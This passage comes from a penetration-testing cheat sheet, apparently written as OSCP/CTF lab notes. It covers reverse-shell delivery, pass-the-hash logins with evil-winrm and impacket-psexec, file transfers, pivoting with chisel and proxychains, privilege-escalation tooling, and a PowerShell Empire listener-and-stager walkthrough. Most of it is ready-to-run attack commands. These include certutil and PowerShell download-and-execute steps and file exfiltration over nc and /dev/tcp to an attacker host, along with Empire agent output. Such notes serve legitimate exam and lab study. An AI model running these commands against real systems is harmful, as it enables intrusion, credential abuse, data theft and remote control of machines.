powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('https://github.com/joetanx/ctf/raw/refs/heads/main/<reverse.py/js>','.\<reverse.py/js>')
```

#### Run the script

```sh
python3 reverse.py <listener_address> <listener_port>
node reverse.js <listener_address> <listener_port>
```

### 4.7. Windows direct connection

#### evil-winrm

- WinRM `5985` must be enabled on the target
- User must be a member of `Remote Management Users` on the target
- evil-winrm provides useful functions such as `upload`/`download` and `services` to check the running services; use `menu` to see the available functions

|   |   |
|---|---|
|Username/password|`evil-winrm -i $TARGET -u $USERNAME -p $PASSWORD`|
|Password hashes|`evil-winrm -i $TARGET -u $USERNAME -H $NT_HASH`|

#### impacket-psexec

- The user must be administrator on the target because PsExec uses the `ADMIN$` to run the service manager
- LM hashes are not used from Windows 10 onwards, use either `00000000000000000000000000000000` (32 zeros) or `aad3b435b51404eeaad3b435b51404ee` (LM hash of NULL) to fill the LM hash portion for impacket-psexec or pth-winexe

|   |   |
|---|---|
|Username/password|`impacket-psexec [$DOMAIN/]$USERNAME:$PASSWORD@$TARGET [$COMMAND]`|
|Password hashes|`impacket-psexec -hashes $LM_HASH:$NT_HASH [$DOMAIN/]$USERNAME@$TARGET [$COMMAND]`|

### 4.8. Upgrade to Full TTY

Certain activities like `su` will not run (error `su: must be run from a terminal`) without a terminal

```sh
python -c 'import pty;pty.spawn("/bin/bash")'
```

## 5. File transfers

### 5.1. HTTP

#### Download

Web root: `/var/www/html`

Windows:

|   |   |
|---|---|
|certutil|`certutil.exe /urlcache /f /split http://$KALI/reverse.exe %TEMP%\reverse.exe`|
|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile('http://$KALI/reverse.exe','%TEMP%\reverse.exe')`|

Linux:

|   |   |
|---|---|
|cURL|`curl -O http://$KALI/reverse.elf`|
|Wget|`wget http://$KALI/reverse.elf`|
|Python|Create `download.py`:<br>`import urllib.request`<br>`urllib.request.urlretrieve('http://$KALI/reverse.elf', 'reverse.elf')`<br>Run `download.py`:<br>`python3 download.py`|

#### Upload

<details>
  <summary>Apache2 setup:</summary>

Prepare uploads directory:

```sh
mkdir /var/www/html/uploads
chown www-data:www-data /var/www/html/uploads
```

☝️ apache2 runs as `www-data` user, it needs write permission on the uploads directory for uploads to succeed

Download [`upload.php`](https://github.com/joetanx/ctf/blob/main/upload.php): `curl -sLo /var/www/html/upload.php https://github.com/joetanx/ctf/raw/refs/heads/main/upload.php`

☝️ The name for the upload parameter is named as default of `file` to accommodate the PowerShell `UploadFile` method of `System.Net.WebClient` which will `POST` the file to this name

</details>

|   |   |
|---|---|
|PowerShell|`powershell.exe -NoProfile -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).UploadFile('http://$KALI/upload.php','$FILENAME')`|
|cURL|`curl -H 'Content-Type:multipart/form-data' -X POST -F file=@"$FILENAME" -v http://$KALI/upload.php`|

### 5.2. SMB

<details>
  <summary>Samba setup:</summary>

Ref: [Create a passwordless guest share in Samba](https://www.techrepublic.com/article/how-to-create-a-passwordless-guest-share-in-samba/)

```sh
sed -i '/;   interfaces/a interfaces = eth0' /etc/samba/smb.conf
sed -i '/;   bind interfaces only = yes/a bind interfaces only = yes' /etc/samba/smb.conf
mkdir /home/share
chmod -R ugo+w /home/share
cat << EOF >> /etc/samba/smb.conf
[public]
path = /home/share
public = yes
guest ok = yes
writable = yes
force create mode = 0666
force directory mode = 0777
browseable = yes
EOF
```

</details>

|   |   |
|---|---|
|Download|`copy \\$KALI\public\$FILENAME .\`|
|Upload|`copy "$FILENAME" \\$KALI\public\`|

### 5.3. FTP

<details>
  <summary>FTP anonymous setup:</summary>

`anon_root` default directory: `/srv/ftp`

```sh
sed -i 's/anonymous_enable=NO/anonymous_enable=YES/' /etc/vsftpd.conf
sed -i 's/#anon_upload_enable=YES/anon_upload_enable=YES/' /etc/vsftpd.conf
```

</details>

```cmd
ftp -A $KALI
ftp> get $FILENAME
```

### 5.4. Netcat

Likely used for scenario to upload a file from target:
- Kali listens with `nc`
- Target doesn't have `curl`, `wget`, `scp`, `ftp`, etc

|   |   |
|---|---|
|Kali|`nc -nvlp 4444 -q 1 > <file> < /dev/null`|
|Target|`cat <file> \| nc <kali-ip> 4444`<br>or<br>`cat test.txt > /dev/tcp/<kali-ip>/4444`|

## 6. [Port forwarding](/notes/port-forwarding.md)

### 6.1. SSH port forwarding

|   |   |
|---|---|
|Local (static)|`ssh -L 0.0.0.0:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET $USERNAME@$TARGET`|
|Local (dynamic)|`ssh -D 0.0.0.0:$PORT_ON_KALI $USERNAME@$TARGET`|
|Remote (static)|`ssh -R 0.0.0.0:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET root@$KALI`|
|Remote (dynamic)|`ssh -R 0.0.0.0:$PORT_ON_KALI root@$KALI`|

### 6.2. [Chisel](https://github.com/jpillora/chisel)

<details>
  <summary>Preparing chisel binaries:</summary>

Prepare server on Kali:

```sh
VERSION=$(curl -sI https://github.com/jpillora/chisel/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
curl -sLO https://github.com/jpillora/chisel/releases/download/v$VERSION/chisel_${VERSION}_linux_amd64.gz
gzip -d chisel_${VERSION}_linux_amd64.gz
mv chisel_${VERSION}_linux_amd64 chisel
chmod +x chisel
```

Prepare client binaries for Windows target to download

```sh
VERSION=$(curl -sI https://github.com/jpillora/chisel/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
curl -sLO https://github.com/jpillora/chisel/releases/download/v$VERSION/chisel_${VERSION}_windows_amd64.zip
unzip chisel_${VERSION}_windows_amd64.zip
mv chisel.exe /var/www/html/
```

Download client binaries on Windows target

```sh
certutil.exe -urlcache -f -split http://$KALI/chisel.exe %TEMP%\chisel.exe
```

</details>

|   |   |
|---|---|
|Server setup|`chisel server --reverse --port 8080`|
|Reverse static|`chisel client $KALI R:$PORT_ON_KALI:$TARGET:$PORT_ON_TARGET`|
|Reverse dynamic|`chisel client $KALI R:0.0.0.0:socks`|

### 6.3. Proxy Chains

<details>
  <summary>Config: <code>/etc/proxychains4.conf</code></summary>

```sh
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
socks5  $KALI 1080
```

</details>

```sh
proxychains -q nmap -Pn -sT -O -sV -sC $TARGET_INTERNAL_NETWORK
proxychains curl http://$TARGET_INTERNAL_NETWORK/
```

> [!Tip]
>
> 1. ProxyChains only work for TCP traffic, i.e. ICMP (ping, traceroute) and SYN (-sS) scans will not work over ProxyChains
> 2. nmap uses `-sS` by default, so the `-sT` option to use TCP Connect() scan is required
> 3. Use `-O -sV -sC` instead of `-A` to omit running traceroute
> 4. nmap scan would be quite slow over ProxyChains, use `-F` to limit the port range to top 100 ports or try to use the pivot box to scan instead

## 7. Linux privilege escalation

First checks - always run:

|   |   |
|---|---|
|Check current user|`whoami`|
|Check current user's group membership|`id`|
|Check current user's sudo abilities (requires password)|`sudo -l`|
|Check other users in the target|`cat /etc/passwd`|
|Enumerate current user's home directory<br>(Replace `~` with `.` to recursively enumerate from `pwd`)|`ls -lRa ~`<br>`find ~ -ls`<br>Files only: `find ~ -type f -ls`<br>Directories only: `find ~ -type d -ls`|
|Check for passwords echoed in history|`history`|

### 7.1. [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)

|   |   |
|---|---|
|Prepare Kali|`curl -sLo /var/www/html/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`|
|Download and run on target|`curl -O http://$KALI/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh`|
|All checks - deeper system enumeration, but it takes longer to complete|`./linpeas.sh -a`|
|Password - Pass a password that will be used with sudo -l and bruteforcing other users|`./linpeas.sh -P`|

### 7.2. [LSE](https://github.com/diego-treitos/linux-smart-enumeration)

|   |   |
|---|---|
|Prepare Kali|`curl -L -o /var/www/html/lse.sh https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh`|
|Download and run on target|`curl -O http://$KALI/lse.sh && chmod +x lse.sh && ./lse.sh`|
|Shows interesting information that should help you to privesc|`./lse.sh -l1`|
|Dump all the information it gathers about the system|`./lse.sh -l2`|

### 7.3. [LinEnum](https://github.com/rebootuser/LinEnum)

|   |   |
|---|---|
|Prepare Kali|`curl -Lo /var/www/html/LinEnum.sh https://github.com/rebootuser/LinEnum/raw/master/LinEnum.sh`|
|Download and run on target|`curl -O http://$KALI/LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh`|

```sh
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

Options:
- `-k` Enter keyword
- `-e` Enter export location
- `-t` Include thorough (lengthy) tests
- `-s` Supply current user password to check sudo perms (INSECURE)
- `-r` Enter report name
- `-h` Displays this help text

## 8. Windows privilege escalation

### 8.1. [PowerView](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)

Used in: [svcorp](https://github.com/joetanx/oscp/blob/main/pwk-lab/svcorp.md#133-powerview), [XOR-APP59](https://github.com/joetanx/oscp/blob/main/pwk-lab/xor.md#135-powerview), [PWK AD Exercise II](https://github.com/joetanx/oscp/blob/main/pwk-exercises/ad2.md)

Prepare Kali:

```sh
curl -sLo /var/www/html/PowerView.ps1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Recon/PowerView.ps1
```

Import on target:

```sh
certutil.exe -urlcache -f -split http://$KALI/PowerView.ps1
Set-ExecutionPolicy RemoteSigned -Scope CurrentUser
Import-Module .\PowerView.ps1
Get-Module
```

Interesting commands:

```sh
Get-Domain
Get-DomainController
(Get-DomainPolicy).SystemAccess
Get-DomainUser | Where-Object {$_.memberof -like '*Domain Admins*'} | Format-Table -AutoSize samaccountname,memberof
Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | Format-Table -AutoSize MemberName
Get-DomainGroup -MemberIdentity <username> | Format-Table -AutoSize samaccountname
Invoke-ShareFinder
Get-NetGPO | Format-Table -AutoSize displayname,whenchanged,whencreated
```

<details>
  <summary><h3><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a></h3></summary>

Used in: [PWK AD Exercise II](https://github.com/joetanx/oscp/blob/main/pwk-exercises/ad2.md), [svcorp](https://github.com/joetanx/oscp/blob/main/pwk-lab/svcorp.md#122-powerup)

Prepare Kali:

```sh
curl -Lo /var/www/html/Get-System.ps1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/Get-System.ps1
curl -Lo /var/www/html/PowerUp.ps1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/PowerUp.ps1
curl -Lo /var/www/html/Privesc.psd1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/Privesc.psd1
curl -Lo /var/www/html/Privesc.psm1 https://github.com/PowerShellMafia/PowerSploit/raw/master/Privesc/Privesc.psm1
```

Import on target:

```cmd
certutil.exe -urlcache -f -split http://$KALI/Get-System.ps1
certutil.exe -urlcache -f -split http://$KALI/PowerUp.ps1
certutil.exe -urlcache -f -split http://$KALI/Privesc.psd1
certutil.exe -urlcache -f -split http://$KALI/Privesc.psm1
Set-ExecutionPolicy Bypass -Scope CurrentUser
Import-Module .\Privesc.psm1
Get-Module
Get-Command -Module Privesc
```

Run check:

```cmd
Invoke-AllChecks
```

</details>

### 8.2. [PrivescCheck](https://github.com/itm4n/PrivescCheck)

```pwsh
Invoke-WebRequest -Uri https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1 -OutFile .\PrivescCheck.ps1
```

```cmd
powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
```

### 8.3. [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

[Releases](https://github.com/peass-ng/PEASS-ng/releases)

#### Prepare Kali

```sh
VERSION=$(curl -sI https://github.com/peass-ng/PEASS-ng/releases/latest | grep location: | cut -d / -f 8 | tr -d '\r' | tr -d 'v')
curl -sLo /var/www/html/winPEAS.bat https://github.com/peass-ng/PEASS-ng/releases/download/$VERSION/winPEAS.bat
```

#### Download and run on target

```cmd
certutil.exe /urlcache /f /split http://$KALI/winPEAS.bat %TEMP%\winPEAS.bat && %TEMP%\winPEAS.bat
```

### 8.4. JuicyPotato

Windows Privilege Escalation with **SeImpersonatePrivilege** and **SeAssignPrimaryTokenPrivilege**

Used in: [sandbox](https://github.com/joetanx/oscp/blob/main/pwk-lab/sandbox.md), [disco](https://github.com/joetanx/oscp/blob/main/pwk-lab/disco.md)

### 8.5. Switching user with [RunasCs](https://github.com/antonioCoco/RunasCs)

If you have a shell and credentials for another user, but cannot PsExec/evilwinrm to the target, use RunasCs to start `cmd` as that user.

Prepare RunasCs in Kali:

```sh
curl -LO https://github.com/antonioCoco/RunasCs/releases/download/v1.4/RunasCs.zip
unzip RunasCs.zip
mv RunasCs.exe /var/www/html
```

Execute:

```cmd
.\RunasCs.exe $USERNAME $PASSWORD cmd -r $KALI:$PORT
.\RunasCs.exe $USERNAME $PASSWORD cmd -r $KALI:$PORT --bypass-uac
```

Used in: [flight](/htb/flight.md)

### 8.6. [PowerShell Empire](https://github.com/BC-SECURITY/Empire)

#### 8.6.1. Prepare PowerShell Empire

Start Empire server on Kali: `powershell-empire server`

Start Empire client on Kali: `powershell-empire client`

#### 8.6.2. Create a listener

|   |   |
|---|---|
|Select listener|`uselistener http`<br>☝️ To see the list of listeners: type `uselistener ` (don't forget the space) and press `tab`|
|Select the IP address to listen on|`set Host 192.168.17.10`|
|Select the port to listen on|`set Port 8080`|
|Name the listener|`set Name http_1`|

<details>
  <summary>Example output</summary>

```cmd
(Empire) > uselistener http

 Author       @harmj0y
 Description  Starts a http[s] listener (PowerShell or Python) that uses a GET/POST
              approach.
 Name         HTTP[S]


┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ CertPath         │                                     │ False    │ Certificate path for https          │
│                  │                                     │          │ listeners.                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Cookie           │ UYPIeDVnm                           │ False    │ Custom Cookie Name                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultDelay     │ 5                                   │ True     │ Agent delay/reach back interval (in │
│                  │                                     │          │ seconds).                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
│                  │                                     │          │ (0.0-1.0).                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
│                  │                                     │          │ exiting                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
│                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     │
│                  │ like Gecko                          │          │                                     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ http://192.168.17.10                │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ KillDate         │                                     │ False    │ Date for the listener to exit       │
│                  │                                     │          │ (MM/dd/yyyy).                       │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ http                                │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │                                     │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
│                  │                                     │          │ none, or other).                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
│                  │                                     │          │ ([domain\]username:password) to use │
│                  │                                     │          │ for request (default, none, or      │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
│                  │                                     │          │ communicate with your Slack         │
│                  │                                     │          │ instance.                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
│                  │                                     │          │ /download/. Example:                │
│                  │                                     │          │ /download/stager.php                │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagingKey       │ KgAj;>EMiTb<~]lI#LS!?qP:}6op)9Yv    │ True     │ Staging key for initial agent       │
│                  │                                     │          │ negotiation.                        │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
│                  │                                     │          │ staging request (default, none, or  │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
│                  │                                     │          │ (09:00-17:00).                      │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: uselistener/http) > set Host 192.168.17.10
[*] Set Host to 192.168.17.10
(Empire: uselistener/http) > set Port 8080
[*] Set Port to 8080
(Empire: uselistener/http) > set Name http_1
[*] Set Name to http_1
(Empire: uselistener/http) > options

┌Record Options────┬─────────────────────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value                               │ Required │ Description                         │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ BindIP           │ 0.0.0.0                             │ True     │ The IP to bind to on the control    │
│                  │                                     │          │ server.                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ CertPath         │                                     │ False    │ Certificate path for https          │
│                  │                                     │          │ listeners.                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Cookie           │ UYPIeDVnm                           │ False    │ Custom Cookie Name                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultDelay     │ 5                                   │ True     │ Agent delay/reach back interval (in │
│                  │                                     │          │ seconds).                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultJitter    │ 0.0                                 │ True     │ Jitter in agent reachback interval  │
│                  │                                     │          │ (0.0-1.0).                          │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultLostLimit │ 60                                  │ True     │ Number of missed checkins before    │
│                  │                                     │          │ exiting                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ DefaultProfile   │ /admin/get.php,/news.php,/login/pro │ True     │ Default communication profile for   │
│                  │ cess.php|Mozilla/5.0 (Windows NT    │          │ the agent.                          │
│                  │ 6.1; WOW64; Trident/7.0; rv:11.0)   │          │                                     │
│                  │ like Gecko                          │          │                                     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Headers          │ Server:Microsoft-IIS/7.5            │ True     │ Headers for the control server.     │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Host             │ 192.168.17.10                       │ True     │ Hostname/IP for staging.            │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ JA3_Evasion      │ False                               │ True     │ Randomly generate a JA3/S signature │
│                  │                                     │          │ using TLS ciphers.                  │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ KillDate         │                                     │ False    │ Date for the listener to exit       │
│                  │                                     │          │ (MM/dd/yyyy).                       │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Launcher         │ powershell -noP -sta -w 1 -enc      │ True     │ Launcher string.                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Name             │ http_1                              │ True     │ Name for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Port             │ 8080                                │ True     │ Port for the listener.              │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ Proxy            │ default                             │ False    │ Proxy to use for request (default,  │
│                  │                                     │          │ none, or other).                    │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ ProxyCreds       │ default                             │ False    │ Proxy credentials                   │
│                  │                                     │          │ ([domain\]username:password) to use │
│                  │                                     │          │ for request (default, none, or      │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ SlackURL         │                                     │ False    │ Your Slack Incoming Webhook URL to  │
│                  │                                     │          │ communicate with your Slack         │
│                  │                                     │          │ instance.                           │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagerURI        │                                     │ False    │ URI for the stager. Must use        │
│                  │                                     │          │ /download/. Example:                │
│                  │                                     │          │ /download/stager.php                │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ StagingKey       │ KgAj;>EMiTb<~]lI#LS!?qP:}6op)9Yv    │ True     │ Staging key for initial agent       │
│                  │                                     │          │ negotiation.                        │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ UserAgent        │ default                             │ False    │ User-agent string to use for the    │
│                  │                                     │          │ staging request (default, none, or  │
│                  │                                     │          │ other).                             │
├──────────────────┼─────────────────────────────────────┼──────────┼─────────────────────────────────────┤
│ WorkingHours     │                                     │ False    │ Hours for the agent to operate      │
│                  │                                     │          │ (09:00-17:00).                      │
└──────────────────┴─────────────────────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: uselistener/http) > execute
[+] Listener http_1 successfully started
```

</details>

#### 8.6.3. Generate stager

|   |   |
|---|---|
|Select stager|`usestager windows/launcher_bat`<br>☝️ To see the list of stagers: type `usestager ` (don't forget the space) and press `tab`|
|Select the listener to associate stager with|`set Listener <Name>`|

<details>
  <summary>Example output</summary>

```cmd
(Empire: uselistener/http) > usestager windows/launcher_bat

 Author       @harmj0y
 Description  Generates a self-deleting .bat launcher for Empire. Only works with
              the HTTP and HTTP COM listeners.
 Name         windows/launcher_bat


┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher     │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Delete           │ True               │ False    │ Switch. Delete .bat after running.  │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language         │ powershell         │ True     │ Language of the stager to generate. │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │                    │ True     │ Listener to generate stager for.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
│                  │                    │          │ powershell code, uses the           │
│                  │                    │          │ ObfuscateCommand for obfuscation    │
│                  │                    │          │ types. For powershell only.         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
│                  │                    │          │ use. Only used if Obfuscate switch  │
│                  │                    │          │ is True. For powershell only.       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ OutFile          │ launcher.bat       │ False    │ Filename that should be used for    │
│                  │                    │          │ the generated output, otherwise     │
│                  │                    │          │ returned as a string.               │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘

(Empire: usestager/windows/launcher_bat) > set Listener http_1
[*] Set Listener to http_1
(Empire: usestager/windows/launcher_bat) > options

┌Record Options────┬────────────────────┬──────────┬─────────────────────────────────────┐
│ Name             │ Value              │ Required │ Description                         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Bypasses         │ mattifestation etw │ False    │ Bypasses as a space separated list  │
│                  │                    │          │ to be prepended to the launcher     │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Delete           │ True               │ False    │ Switch. Delete .bat after running.  │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Language         │ powershell         │ True     │ Language of the stager to generate. │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Listener         │ http_1             │ True     │ Listener to generate stager for.    │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ Obfuscate        │ False              │ False    │ Switch. Obfuscate the launcher      │
│                  │                    │          │ powershell code, uses the           │
│                  │                    │          │ ObfuscateCommand for obfuscation    │
│                  │                    │          │ types. For powershell only.         │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ ObfuscateCommand │ Token\All\1        │ False    │ The Invoke-Obfuscation command to   │
│                  │                    │          │ use. Only used if Obfuscate switch  │
│                  │                    │          │ is True. For powershell only.       │
├──────────────────┼────────────────────┼──────────┼─────────────────────────────────────┤
│ OutFile          │ launcher.bat       │ False    │ Filename that should be used for    │
│                  │                    │          │ the generated output, otherwise     │
│                  │                    │          │ returned as a string.               │
└──────────────────┴────────────────────┴──────────┴─────────────────────────────────────┘
(Empire: usestager/windows/launcher_bat) > execute
[+] launcher.bat written to /var/lib/powershell-empire/empire/client/generated-stagers/launcher.bat
```

</details>

Prepare stager in Kali web server: `cp /var/lib/powershell-empire/empire/client/generated-stagers/launcher.bat /var/www/html`

Download and run stager in target: `certutil.exe /urlcache /f /split http://$KALI/launcher.bat %TEMP%\launcher.bat && %TEMP%\launcher.bat`

Verify listener hooked:

```cmd
[+] New agent XM8LSE5D checked in
[*] Sending agent (stage 2) to XM8LSE5D at 192.168.84.43
```

#### 8.6.4. Interact with agent

|   |   |
|---|---|
|List agents|`agents`|
|Connet to an agent|`interact <Name>`|

<details>
  <summary>Example output</summary>

```cmd
(Empire) > agents

┌Agents─────────┬────────────┬───────────────┬───────────────────────┬────────────┬─────┬───────┬─────────────────────────┬──────────┐
│ ID │ Name     │ Language   │ Internal IP   │ Username              │ Process    │ PID │ Delay │ Last Seen               │ Listener │
├────┼──────────┼────────────┼───────────────┼───────────────────────┼────────────┼─────┼───────┼─────────────────────────┼──────────┤
│ 1  │ XM8LSE5D │ powershell │ 192.168.84.43 │ DESKTOP-87GBIPQ\admin │ powershell │ 928 │ 5/0.0 │ 2023-01-27 14:49:02 +08 │ http_1   │
│    │          │            │               │                       │            │     │       │ (2 seconds ago)         │          │
└────┴──────────┴────────────┴───────────────┴───────────────────────┴────────────┴─────┴───────┴─────────────────────────┴──────────┘
(Empire: agents) > interact XM8LSE5D
(Empire: XM8LSE5D) > info

┌Agent Options─────┬───────────────────────────────────────────────┐
│ ID               │ 1                                             │
├──────────────────┼───────────────────────────────────────────────┤
│ architecture     │ AMD64                                         │
├──────────────────┼───────────────────────────────────────────────┤
│ checkin_time     │ 2023-01-27T06:47:34.000958+00:00              │
├──────────────────┼───────────────────────────────────────────────┤
│ children         │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ delay            │ 5                                             │
├──────────────────┼───────────────────────────────────────────────┤
│ external_ip      │ 192.168.84.43                                 │
├──────────────────┼───────────────────────────────────────────────┤
│ functions        │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ high_integrity   │ 0                                             │
├──────────────────┼───────────────────────────────────────────────┤
│ hostname         │ DESKTOP-87GBIPQ                               │
├──────────────────┼───────────────────────────────────────────────┤
│ internal_ip      │ 192.168.84.43                                 │
├──────────────────┼───────────────────────────────────────────────┤
│ jitter           │ 0.0                                           │
├──────────────────┼───────────────────────────────────────────────┤
│ kill_date        │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ language         │ powershell                                    │
├──────────────────┼───────────────────────────────────────────────┤
│ language_version │ 5                                             │
├──────────────────┼───────────────────────────────────────────────┤
│ lastseen_time    │ 2023-01-27T06:49:27.000666+00:00              │
├──────────────────┼───────────────────────────────────────────────┤
│ listener         │ http_1                                        │
├──────────────────┼───────────────────────────────────────────────┤
│ lost_limit       │ 60                                            │
├──────────────────┼───────────────────────────────────────────────┤
│ name             │ XM8LSE5D                                      │
├──────────────────┼───────────────────────────────────────────────┤
│ nonce            │ 0850380696394468                              │
├──────────────────┼───────────────────────────────────────────────┤
│ notes            │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ os_details       │ Microsoft Windows 11 Pro                      │
├──────────────────┼───────────────────────────────────────────────┤
│ parent           │                                               │
├──────────────────┼───────────────────────────────────────────────┤
│ process_id       │ 928                                           │
├──────────────────┼───────────────────────────────────────────────┤
│ process_name     │ powershell                                    │
